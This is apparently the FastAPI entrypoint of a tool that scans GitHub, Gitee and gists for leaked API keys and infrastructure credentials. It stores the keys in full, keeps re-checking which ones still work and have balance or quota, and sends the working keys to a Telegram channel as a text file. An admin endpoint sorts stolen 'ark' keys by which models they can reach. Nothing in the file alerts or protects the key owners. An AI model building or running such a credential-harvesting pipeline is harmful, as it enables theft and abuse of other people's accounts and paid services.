"""
FastAPI entrypoint.

Background tasks (all concurrent, independent):
  _scan_loop()          — code-search scanner, N parallel workers per PAT
  _hourly_alert_loop()  — Telegram digest every hour
  trufflehog_loop()     — org/user sweep via trufflehog (if configured)
"""

import asyncio
import html
import logging
import os
from contextlib import asynccontextmanager
from datetime import datetime, timezone, timedelta

from fastapi import FastAPI, Header, HTTPException, Query
from fastapi.responses import HTMLResponse

import db
from config import (SCAN_INTERVAL, HOURLY_ALERT, GITHUB_TOKENS, MAX_PAGES,
                    INFRA_LOW_RISK_MAX_DAYS, DB_PATH)
from scanner import run_cycle, _TOKEN_STATUS
from notifier import notify_hourly_digest, notify_infra_hourly, flush_unverified_buffer
from trufflehog_runner import trufflehog_loop
from gitee_scanner import gitee_loop
from events_scanner import events_loop
from gist_scanner import gists_loop

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
log = logging.getLogger(__name__)


async def _scan_loop():
    while True:
        try:
            await run_cycle()
        except Exception as e:
            log.error("cycle crashed: %s", e)
        log.info("sleeping %ds until next cycle", SCAN_INTERVAL)
        await asyncio.sleep(SCAN_INTERVAL)


async def _revalidation_loop():
    """
    Re-validate keys already in DB as is_valid=1 every 12 h.
    Catches quota expiry (Google free-tier resets daily but runs out quickly),
    depleted balances (DeepSeek/OpenAI), and revoked keys.
    Updates is_valid=0 + last_validated_at so the web UI and future reports
    reflect current reality, not the snapshot from when the key was first found.
    """
    from validators import validate as _validate
    while True:
        await asyncio.sleep(43200)  # 12 h
        try:
            rows = db.get_valid_keys_to_revalidate(max_age_hours=12)
            if not rows:
                continue
            n_dead = 0
            for row in rows:
                ok = await _validate(row["provider"], row["key_full"])
                db.update_key_validity(row["key_hash"], ok)
                if not ok:
                    n_dead += 1
            log.info("revalidation: %d/%d keys now dead, %d still alive",
                     n_dead, len(rows), len(rows) - n_dead)
        except Exception as e:
            log.error("revalidation loop err: %s", e)


async def _cleanup_loop():
    """Daily cleanup of old low-risk infra findings to keep DB size bounded."""
    while True:
        await asyncio.sleep(86400)  # once per day
        try:
            n = db.cleanup_old_low_risk(older_than_days=INFRA_LOW_RISK_MAX_DAYS)
            if n:
                log.info("cleanup: removed %d old low-risk infra findings (>%dd)",
                         n, INFRA_LOW_RISK_MAX_DAYS)
        except Exception as e:
            log.error("cleanup loop err: %s", e)


async def _flush_loop():
    """Flush buffered unverified keys to Telegram every 15 minutes."""
    while True:
        await asyncio.sleep(900)
        try:
            n = await flush_unverified_buffer()
            if n:
                log.info("flushed %d valid keys to Telegram as text file", n)
            else:
                log.debug("flush: buffer empty, nothing to send")
        except Exception as e:
            log.error("flush loop err: %s", e)


async def _hourly_alert_loop():
    if not HOURLY_ALERT:
        return
    while True:
        await asyncio.sleep(3600)
        try:
            since      = (datetime.now(timezone.utc) - timedelta(hours=1)).isoformat()
            by_prov    = db.get_keys_since(since)
            new_valid  = db.get_valid_since(since)
            total_new  = sum(r["cnt"] for r in by_prov)
            total_valid = sum(r["valid_cnt"] for r in by_prov)
            await notify_hourly_digest(by_prov, total_new, total_valid, new_valid)
            log.info("hourly digest: %d new keys", total_new)

            # Infra credentials hourly digest
            infra_rows  = db.get_infra_since(since)
            infra_total = sum(r["cnt"] for r in infra_rows)
            infra_high  = sum(r.get("high_cnt", 0) for r in infra_rows)
            await notify_infra_hourly(infra_rows, infra_total, infra_high)
        except Exception as e:
            log.error("hourly alert err: %s", e)


@asynccontextmanager
async def lifespan(app: FastAPI):
    db.init_db()
    tasks = [
        asyncio.create_task(_scan_loop(),           name="scan_loop"),
        asyncio.create_task(_hourly_alert_loop(),   name="hourly_alert"),
        asyncio.create_task(_flush_loop(),          name="flush_buffer"),
        asyncio.create_task(_cleanup_loop(),        name="db_cleanup"),
        asyncio.create_task(_revalidation_loop(),   name="revalidation"),
        asyncio.create_task(trufflehog_loop(),      name="trufflehog"),
        asyncio.create_task(gitee_loop(),           name="gitee_scanner"),
        asyncio.create_task(events_loop(),          name="events_scanner"),
        asyncio.create_task(gists_loop(),           name="gists_scanner"),
    ]
    yield
    for t in tasks:
        t.cancel()


app = FastAPI(title="GitHub Key Scanner", lifespan=lifespan)

# Optional admin secret for mutating endpoints (/admin/vacuum).
# Set ADMIN_TOKEN on Railway; if not set, endpoint is open (acceptable for private deploys).
_ADMIN_TOKEN: str = os.environ.get("ADMIN_TOKEN", "")


def _check_admin(authorization: str | None):
    if not _ADMIN_TOKEN:
        return  # not configured — open access
    if authorization != f"Bearer {_ADMIN_TOKEN}":
        raise HTTPException(status_code=401, detail="Unauthorized")


# ── Web UI ─────────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def root():
    stats = db.get_stats()
    rows  = db.get_results(valid_only=False, limit=100)

    by_prov_html = ""
    for row in stats.get("by_provider", []):
        by_prov_html += (
            f"<tr><td>{row['provider'].upper()}</td>"
            f"<td>{row['total']}</td>"
            f"<td style='color:#4caf50'>{row['valid']}</td></tr>"
        )

    rows_html = ""
    for r in rows:
        badge    = "✅" if r["is_valid"] else "⚠️"
        repo_e   = html.escape(r["repo"])
        path_e   = html.escape(r["file_path"])
        prov_e   = html.escape(r["provider"])
        key_e    = html.escape(r["key_preview"])
        ftype_e  = html.escape(r["file_type"])
        rows_html += (
            f"<tr><td>{badge}</td>"
            f"<td>{prov_e}</td>"
            f"<td><code>{key_e}</code></td>"
            f"<td><a href='https://github.com/{repo_e}' target='_blank'>{repo_e}</a></td>"
            f"<td>⭐{r['repo_stars']}</td>"
            f"<td>{ftype_e}</td>"
            f"<td>{r['discovered_at'][:16]}</td></tr>\n"
        )

    n_tokens = len(GITHUB_TOKENS)
    return f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
<title>Key Scanner</title>
<style>
  body{{font-family:monospace;background:#111;color:#eee;padding:20px}}
  table{{border-collapse:collapse;width:100%;margin-bottom:20px}}
  th,td{{border:1px solid #333;padding:6px 10px;text-align:left}}
  th{{background:#222}}tr:hover{{background:#1a1a1a}}
  a{{color:#58a6ff}}code{{background:#222;padding:2px 5px;border-radius:3px}}
  .stat{{display:inline-block;margin:0 16px 8px 0;font-size:1.1em}}
  h3{{color:#aaa;margin-top:28px;border-bottom:1px solid #333;padding-bottom:6px}}
  .badge{{font-size:.8em;background:#1e3a5f;color:#58a6ff;padding:2px 6px;border-radius:4px}}
</style></head><body>
<h2>🔍 GitHub Key Scanner
  <span class='badge'>{n_tokens} token{"s" if n_tokens!=1 else ""} · {MAX_PAGES} pages/query</span>
</h2>
<p>
  <span class='stat'>Repos: <b>{stats['repos_scanned']}</b></span>
  <span class='stat'>Files: <b>{stats['files_scanned']}</b></span>
  <span class='stat'>Keys: <b>{stats['keys_found']}</b></span>
  <span class='stat'>Valid: <b style='color:#4caf50'>{stats['keys_valid']}</b></span>
</p>
<h3>By Provider</h3>
<table style='width:auto'>
  <thead><tr><th>Provider</th><th>Found</th><th>Valid</th></tr></thead>
  <tbody>{by_prov_html}</tbody>
</table>
<p><a href='/infra'>🏗️ Infrastructure Credentials →</a></p>
<h3>Recent 100 Keys</h3>
<table>
  <thead><tr><th>Status</th><th>Provider</th><th>Key</th>
  <th>Repo</th><th>Stars</th><th>Type</th><th>Found at</th></tr></thead>
  <tbody>{rows_html}</tbody>
</table>
</body></html>"""


@app.get("/stats")
async def stats():
    return db.get_stats()


@app.get("/results")
async def results(valid_only: bool = Query(False), limit: int = Query(200)):
    return db.get_results(valid_only=valid_only, limit=limit)


@app.get("/infra", response_class=HTMLResponse)
async def infra_page(risk: str = Query(None), limit: int = Query(200)):
    istats = db.get_infra_stats()
    rows   = db.get_infra_results(risk_filter=risk, limit=limit)

    _RISK_COLOR = {"high": "#ff4444", "medium": "#ffaa00", "low": "#888"}
    _RISK_BG    = {"high": "#2a0000", "medium": "#1a1200", "low": "#111"}

    by_type_html = ""
    for row in istats.get("by_type", []):
        by_type_html += (
            f"<tr><td>{row['cred_type'].upper()}</td>"
            f"<td>{row['total']}</td>"
            f"<td style='color:#ff4444'>{row['high_risk']}</td>"
            f"<td style='color:#ffaa00'>{row['med_risk']}</td></tr>"
        )

    by_dest_html = ""
    for row in istats.get("by_dest", [])[:10]:
        by_dest_html += (
            f"<tr><td><code>{row['destination']}</code></td>"
            f"<td>{row['cred_type']}</td>"
            f"<td>{row['cnt']}</td></tr>"
        )

    rows_html = ""
    for r in rows:
        rl       = r.get("risk_level", "low")
        col      = _RISK_COLOR.get(rl, "#888")
        bg       = _RISK_BG.get(rl, "#111")
        dest_raw = r.get("destination", "")
        dest     = f"<code>{html.escape(dest_raw)}</code>" if dest_raw else "—"
        v        = r.get("is_validated", -1)
        val_badge = ("✅" if v == 1 else "❌" if v == 0 else "⏳")
        repo_e    = html.escape(r["repo"])
        ctype_e   = html.escape(r["cred_type"].upper())
        prev_e    = html.escape(r["cred_preview"])
        ftype_e   = html.escape(r["file_type"])
        rows_html += (
            f"<tr style='background:{bg}'>"
            f"<td style='color:{col};font-weight:bold'>{rl.upper()}</td>"
            f"<td>{val_badge}</td>"
            f"<td>{ctype_e}</td>"
            f"<td><code>{prev_e}</code></td>"
            f"<td>{dest}</td>"
            f"<td><a href='https://github.com/{repo_e}' target='_blank'>{repo_e}</a></td>"
            f"<td>⭐{r['repo_stars']}</td>"
            f"<td>{ftype_e}</td>"
            f"<td>{r['discovered_at'][:16]}</td></tr>\n"
        )

    filter_links = (
        "<a href='/infra'>All</a> · "
        "<a href='/infra?risk=high' style='color:#ff4444'>High</a> · "
        "<a href='/infra?risk=medium' style='color:#ffaa00'>Medium</a> · "
        "<a href='/infra?risk=low' style='color:#888'>Low</a>"
    )

    return f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
<title>Infra Credentials</title>
<style>
  body{{font-family:monospace;background:#111;color:#eee;padding:20px}}
  table{{border-collapse:collapse;width:100%;margin-bottom:20px}}
  th,td{{border:1px solid #333;padding:6px 10px;text-align:left}}
  th{{background:#222}}tr:hover{{filter:brightness(1.2)}}
  a{{color:#58a6ff}}code{{background:#222;padding:2px 5px;border-radius:3px}}
  .stat{{display:inline-block;margin:0 16px 8px 0;font-size:1.1em}}
  h3{{color:#aaa;margin-top:28px;border-bottom:1px solid #333;padding-bottom:6px}}
</style></head><body>
<h2>🏗️ Infrastructure Credentials</h2>
<p>
  <span class='stat'>Total: <b>{istats['total']}</b></span>
  <span class='stat' style='color:#ff4444'>High risk: <b>{istats['high']}</b></span>
  <span class='stat' style='color:#ffaa00'>Medium: <b>{istats['medium']}</b></span>
</p>
<p>{filter_links}</p>
<h3>By Type</h3>
<table style='width:auto'>
  <thead><tr><th>Type</th><th>Total</th><th>High</th><th>Medium</th></tr></thead>
  <tbody>{by_type_html}</tbody>
</table>
{"<h3>Top Destinations</h3><table style='width:auto'><thead><tr><th>Host</th><th>Type</th><th>Count</th></tr></thead><tbody>" + by_dest_html + "</tbody></table>" if by_dest_html else ""}
<h3>Findings ({risk or "all"}, limit {limit})</h3>
<table>
  <thead><tr><th>Risk</th><th>Valid</th><th>Type</th><th>Preview</th><th>Destination</th>
  <th>Repo</th><th>Stars</th><th>File type</th><th>Found at</th></tr></thead>
  <tbody>{rows_html}</tbody>
</table>
<p><a href='/'>← AI Keys</a></p>
</body></html>"""


@app.get("/infra/stats")
async def infra_stats():
    return db.get_infra_stats()


@app.get("/health")
async def health():
    alive   = sum(1 for s in _TOKEN_STATUS.values() if s.get("alive", True))
    total_t = len(GITHUB_TOKENS)
    db_mb   = round(os.path.getsize(DB_PATH) / 1024 / 1024, 2) if os.path.exists(DB_PATH) else 0
    return {
        "ok":     alive > 0,
        "tokens": {
            "total": total_t,
            "alive": alive if _TOKEN_STATUS else "unchecked",
            "dead":  total_t - alive if _TOKEN_STATUS else 0,
            "status": {
                k: {
                    "alive":              v.get("alive"),
                    "search_remaining":   v.get("remaining"),
                    "search_limit":       v.get("limit"),
                    "core_remaining":     v.get("core_remaining"),
                    "core_limit":         v.get("core_limit"),
                    "core_blocked_until": v.get("core_blocked_until", 0),
                }
                for k, v in _TOKEN_STATUS.items()
            },
        },
        "db_mb":        db_mb,
        "files_scanned": db.get_stats().get("files_scanned", 0),
    }


@app.post("/admin/revalidate")
async def admin_revalidate(authorization: str | None = Header(default=None)):
    """
    Re-validate ALL keys currently marked is_valid=1 right now (don't wait for the 12h loop).
    Updates is_valid=0 + last_validated_at for keys that no longer pass.
    Use after bulk imports, or to instantly clean up stale valid flags.
    """
    _check_admin(authorization)
    from validators import validate as _validate
    # max_age_hours=0 → cutoff=now → everything with NULL or any past time qualifies
    rows = db.get_valid_keys_to_revalidate(max_age_hours=0, limit=2000)
    results: dict[str, list[str]] = {"dead": [], "alive": []}
    for row in rows:
        ok = await _validate(row["provider"], row["key_full"])
        db.update_key_validity(row["key_hash"], ok)
        results["dead" if not ok else "alive"].append(
            f"{row['provider']}:{row['key_full'][:16]}…"
        )
    log.info("admin revalidate: %d dead, %d alive out of %d checked",
             len(results["dead"]), len(results["alive"]), len(rows))
    return {
        "checked":    len(rows),
        "now_dead":   len(results["dead"]),
        "still_alive": len(results["alive"]),
        "dead_keys":  results["dead"],
    }


@app.post("/admin/fix_ark")
async def admin_fix_ark(authorization: str | None = Header(default=None)):
    """
    Reclassify existing 'ark' is_valid=1 keys by probing which 2.0 model they can access:
      • 2.0-fast accessible → update provider to 'ark_fast'
      • 2.0-standard only   → keep provider as 'ark'
      • neither (1.0 only)  → mark is_valid=0
    Run once after deploying the ark_fast split to fix legacy DB entries.
    """
    _check_admin(authorization)
    from validators import validate_ark_fast as _vfast, validate_ark as _vstd
    rows = db.get_valid_keys_by_provider("ark")
    results = {"ark_fast": [], "ark": [], "invalidated": []}
    for row in rows:
        key  = row["key_full"]
        khash = row["key_hash"]
        if await _vfast(key):
            db.update_key_provider(khash, "ark_fast")
            db.update_key_validity(khash, True)
            results["ark_fast"].append(key[:16] + "…")
        elif await _vstd(key):
            db.update_key_validity(khash, True)   # provider stays 'ark'
            results["ark"].append(key[:16] + "…")
        else:
            db.update_key_validity(khash, False)  # 1.0-only → dead
            results["invalidated"].append(key[:16] + "…")
    log.info("fix_ark: %d→ark_fast, %d→ark, %d invalidated",
             len(results["ark_fast"]), len(results["ark"]), len(results["invalidated"]))
    return results


@app.post("/admin/vacuum")
async def admin_vacuum(authorization: str | None = Header(default=None)):
    """Full SQLite VACUUM — repacks DB file after bulk deletes. Takes a few seconds."""
    _check_admin(authorization)
    before = os.path.getsize(DB_PATH) if os.path.exists(DB_PATH) else 0

    def _do():
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
        conn.execute("VACUUM")
        conn.close()

    await asyncio.to_thread(_do)
    after = os.path.getsize(DB_PATH) if os.path.exists(DB_PATH) else 0
    return {
        "ok":       True,
        "before_mb": round(before / 1024 / 1024, 2),
        "after_mb":  round(after  / 1024 / 1024, 2),
        "freed_mb":  round((before - after) / 1024 / 1024, 2),
    }
